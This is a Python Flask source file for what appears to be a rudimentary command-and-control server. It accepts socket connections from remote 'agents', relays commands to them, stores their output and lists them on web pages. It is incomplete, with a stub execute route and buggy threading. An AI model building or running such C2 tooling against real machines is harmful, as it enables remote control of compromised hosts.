import socket
import threading,time
import flask
from flask import *


ip = '127.0.0.1'
port = 6666

thread_index=0
THREADS = []
CMD_INPUT=[]
CMD_OUTPUT=[]
IPS=[]
active_connections = 0

app=Flask(__name__)

for i in range(20):
    #THREADS.append('')
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append('')


def handle_conn(connection, address, thread_index):
    global CMD_INPUT
    global CMD_OUTPUT
    global active_connections
    #global thread_index  # Declare thread_index as global
    active_connections += 1
    msg = connection.recv(2048).decode()
    CMD_OUTPUT[thread_index] = msg
    while CMD_INPUT[thread_index] != 'quit' and CMD_INPUT[thread_index] != '':
        msg = CMD_INPUT[thread_index]
        connection.send(msg.encode())
        msg = connection.recv(2048).decode()
        CMD_OUTPUT[thread_index] = msg
    active_connections -= 1
    connection_sakkaune(connection)



def connection_sakkaune(connection):
    connection.close()


def server_socket():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip, port))
    ss.listen(5)
    global THREADS
    global IPS
    #global thread_index 
    print(f"Server listening on {ip}:{port}")

    while True:
        connection, address = ss.accept()
        thread_index=len(THREADS)
        t = threading.Thread(target=handle_conn, args=(connection, address,len(THREADS)))
        THREADS.append(t)
        IPS[thread_index]=address
        print(f"Active connections: {active_connections}")
        t.start()



@app.before_request
def before_request():
    s1 = threading.Thread(target=server_socket)
    s1.start()


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/agents')
def agents():
    return render_template('agents.html',threads=THREADS,ips=IPS)

@app.route('/<agentname>/executecmd')
def executecmd(agentname):
    return render_template("execute.html")

@app.route('/<agentname>/execute')
def execute(agentname):
    pass
    #if request.method=='POST':
       # cmd=request.form['command']


if __name__=='__main__':
    app.run(debug=True)
